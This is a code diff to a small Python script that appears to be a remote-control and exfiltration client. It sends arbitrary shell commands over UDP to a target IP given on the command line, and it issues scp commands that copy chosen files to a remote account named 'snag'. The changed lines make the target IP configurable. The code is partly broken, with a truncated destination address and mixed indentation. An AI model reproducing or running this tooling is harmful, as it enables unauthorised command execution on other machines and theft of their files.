@@ -4,22 +4,28 @@ import sys, socket
 commands = ['execute', 'exfil']
 
 if len(sys.argv) <2:
-    print("USAGE: " + sys.argv[0] + " " + str(commands))
+    print("USAGE: " + sys.argv[0] + " [IP]  " + str(commands))
+
+ip = sys.argv[1]
 
 def execute(command):
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	sock.sendto((command), ('192.168.43.84', 5050))
+	try:
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sock.sendto((command), (ip, 5050))
+	
+	except socket.gaierror:
+		print("OWO (notices lack of internet connection)")
 
 def exfiltrate(filepath):
-	command = 'scp ' + filepath + " snag@127.0.0.1:~/milo"
+	command = ('scp ' + filepath + " snag@192.168.:~/milo")
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	sock.sendto((command) ,('192.168.43.84', 5050))
+	sock.sendto((command), (ip, 5050))
 
-if sys.argv[1] in commands:
-    instruction = sys.argv[1]
+if sys.argv[2] in commands:
+    instruction = sys.argv[2]
     if instruction == 'execute':
-        shellCom = sys.argv[2]
-        for x in range(3, len(sys.argv)):
+        shellCom = sys.argv[3]
+        for x in range(4, len(sys.argv)):
             shellCom = shellCom + " " + sys.argv[x]
         execute(shellCom)
 	if instruction == 'exfil':
@@ -28,4 +34,4 @@ if sys.argv[1] in commands:
 		exfiltrate(filepath)
 
 else:
-    print("USAGE: " + sys.argv[0] + " " + str(commands))
+    print("USAGE: " + sys.argv[0] + " [IP] " + str(commands))
